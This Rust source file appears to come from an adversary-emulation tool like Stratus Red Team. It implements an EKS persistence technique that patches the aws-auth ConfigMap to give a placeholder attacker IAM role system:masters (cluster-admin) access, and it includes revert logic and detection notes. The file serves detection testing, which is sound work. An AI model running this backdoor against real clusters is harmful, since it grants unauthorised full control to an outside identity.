use std::collections::HashMap;
use std::sync::Arc;
use anyhow::Result;
use k8s_openapi::api::core::v1::ConfigMap;
use kube::{Api, Client};
use kube::api::PatchParams;

use crate::platform::Platform;
use crate::providers::CloudProviders;
use crate::tactic::MitreTactic;
use crate::technique::{AttackTechnique, BoxFuture};

const TERRAFORM: &str = r#"
terraform {
  required_providers {
    aws    = { source = "hashicorp/aws",    version = "~> 5.0" }
    random = { source = "hashicorp/random", version = "~> 3.0" }
  }
}

provider "aws" {}

resource "random_string" "suffix" {
  length  = 8
  special = false
  upper   = false
}

# Prereq: an existing EKS cluster. Configure cluster_name in Terraform vars.
variable "cluster_name" {
  description = "Name of existing EKS cluster"
}

data "aws_caller_identity" "current" {}
output "cluster_name"   { value = var.cluster_name }
output "aws_account_id" { value = data.aws_caller_identity.current.account_id }
"#;

const ATTACKER_ROLE_ARN: &str = "arn:aws:iam::012345678901:role/attacker-role";
const ATTACKER_USERNAME: &str = "attacker";
// A simple marker comment to identify our insertion in the YAML
const STRATUS_MARKER: &str = "# stratus-red-team-backdoor";

/// Build a YAML block for an attacker mapRoles entry
fn attacker_map_roles_entry() -> String {
    format!(
        "- rolearn: {}\n  username: {}\n  groups:\n  - system:masters\n  {}\n",
        ATTACKER_ROLE_ARN, ATTACKER_USERNAME, STRATUS_MARKER
    )
}

async fn detonate_impl(
    _outputs: HashMap<String, String>,
    _providers: Arc<CloudProviders>,
) -> Result<()> {
    let client = Client::try_default()
        .await
        .map_err(|e| anyhow::anyhow!(
            "Failed to create Kubernetes client: {}. \
             Ensure KUBECONFIG is configured for the EKS cluster (run: aws eks update-kubeconfig).",
            e
        ))?;

    let configmaps: Api<ConfigMap> = Api::namespaced(client.clone(), "kube-system");

    // Get current aws-auth ConfigMap
    let current_cm = configmaps
        .get("aws-auth")
        .await
        .map_err(|e| anyhow::anyhow!("Failed to get aws-auth ConfigMap: {}", e))?;

    let current_data = current_cm.data.clone().unwrap_or_default();
    let current_map_roles = current_data
        .get("mapRoles")
        .map(|s| s.as_str())
        .unwrap_or("");

    // Check if attacker entry already exists
    if current_map_roles.contains(ATTACKER_ROLE_ARN) {
        println!("Attacker role '{}' already in aws-auth ConfigMap", ATTACKER_ROLE_ARN);
        return Ok(());
    }

    // Append our attacker entry to mapRoles
    let new_map_roles = format!("{}\n{}", current_map_roles.trim_end(), attacker_map_roles_entry());

    // Patch the ConfigMap
    let patch = serde_json::json!({
        "data": {
            "mapRoles": new_map_roles
        }
    });

    configmaps
        .patch(
            "aws-auth",
            &PatchParams::apply("stratus-red-team"),
            &kube::api::Patch::Merge(patch),
        )
        .await
        .map_err(|e| anyhow::anyhow!("Failed to patch aws-auth ConfigMap: {}", e))?;

    println!(
        "Added attacker role '{}' to aws-auth ConfigMap in kube-system — \
         the IAM role now has system:masters (cluster-admin) access to the EKS cluster",
        ATTACKER_ROLE_ARN
    );

    Ok(())
}

fn detonate(
    outputs: HashMap<String, String>,
    providers: Arc<CloudProviders>,
) -> BoxFuture<Result<()>> {
    Box::pin(detonate_impl(outputs, providers))
}

async fn revert_impl(
    _outputs: HashMap<String, String>,
    _providers: Arc<CloudProviders>,
) -> Result<()> {
    let client = Client::try_default()
        .await
        .map_err(|e| anyhow::anyhow!("Failed to create Kubernetes client: {}", e))?;

    let configmaps: Api<ConfigMap> = Api::namespaced(client, "kube-system");

    let current_cm = configmaps
        .get("aws-auth")
        .await
        .map_err(|e| anyhow::anyhow!("Failed to get aws-auth ConfigMap: {}", e))?;

    let current_data = current_cm.data.clone().unwrap_or_default();
    let current_map_roles = current_data
        .get("mapRoles")
        .map(|s| s.as_str())
        .unwrap_or("");

    if !current_map_roles.contains(ATTACKER_ROLE_ARN) {
        println!("Attacker role not found in aws-auth ConfigMap — nothing to revert");
        return Ok(());
    }

    // Remove lines that are part of the attacker entry we inserted
    let new_map_roles: String = current_map_roles
        .lines()
        .filter(|line| {
            !line.contains(ATTACKER_ROLE_ARN)
                && !line.contains(STRATUS_MARKER)
        })
        .collect::<Vec<_>>()
        .join("\n");

    let patch = serde_json::json!({
        "data": {
            "mapRoles": new_map_roles
        }
    });

    configmaps
        .patch(
            "aws-auth",
            &PatchParams::apply("stratus-red-team"),
            &kube::api::Patch::Merge(patch),
        )
        .await
        .map_err(|e| anyhow::anyhow!("Failed to patch aws-auth ConfigMap: {}", e))?;

    println!(
        "Removed attacker role '{}' from aws-auth ConfigMap",
        ATTACKER_ROLE_ARN
    );

    Ok(())
}

fn revert(
    outputs: HashMap<String, String>,
    providers: Arc<CloudProviders>,
) -> BoxFuture<Result<()>> {
    Box::pin(revert_impl(outputs, providers))
}

inventory::submit! {
    AttackTechnique {
        id: "eks.persistence.backdoor-aws-auth-configmap",
        friendly_name: "Backdoor EKS aws-auth ConfigMap",
        description: "Adds an attacker-controlled IAM role to the EKS aws-auth ConfigMap with system:masters group membership, granting cluster-admin Kubernetes access to the external IAM role.",
        detection: "CloudTrail: Kubernetes update/patch on configmaps/aws-auth in kube-system. Kubernetes audit log: ConfigMap modification by unexpected identity.",
        platform: Platform::Eks,
        mitre_tactics: &[MitreTactic::Persistence],
        is_idempotent: true,
        is_slow: false,
        prerequisite_tf: Some(TERRAFORM),
        detonate,
        revert: Some(revert),
    }
}
